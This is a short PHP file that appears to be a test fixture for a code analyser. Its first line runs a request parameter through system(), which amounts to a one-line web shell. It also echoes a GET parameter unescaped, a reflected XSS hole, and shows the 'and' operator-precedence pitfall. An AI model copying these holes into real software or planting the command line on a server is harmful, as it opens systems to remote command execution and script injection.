<?php
system($_REQUEST['command']);

echo $_GET['variable'];

$have_time = true;
$have_money = false;
$take_vacation = $have_time and $have_money;
?>
